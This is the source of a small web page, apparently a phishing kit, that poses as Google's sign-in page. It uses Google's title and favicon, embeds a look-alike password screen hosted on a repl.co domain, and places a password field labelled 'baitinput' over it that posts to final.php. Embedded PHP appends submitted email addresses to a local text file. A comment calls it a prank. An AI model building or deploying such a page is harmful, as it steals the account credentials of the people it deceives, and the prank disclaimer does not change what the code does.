<html>
  <head>
    <title>Sign in - Google Accounts</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width">
    <link href="style.css" rel="stylesheet" type="text/css" />
    <link rel="shortcut icon" type="image/jpg" href="https://www.google.com/favicon.ico"/>
  </head>
  <body>
    <iframe id="embededpage" src="https://signininterface.googleaccounts.repl.co/password"></iframe>
    <form  method="post" action="final.php">
      <input name="password" type="password" id="baitinput" placeholder="Password" autofocus></input>
    </form>
    <!-- THIS is a joke - Disclaimer. I am a kid just trying to do pranks-->
    <?php 
      $myfile = fopen("test.txt", "a") or die("Unable to open file!");
      $txt = "Email Address: ";
      fwrite($myfile, $txt);
      $txt = $_POST['email'];
      fwrite($myfile, $txt);
    ?>
    <script src="script.js"></script>
  </body>
</html>
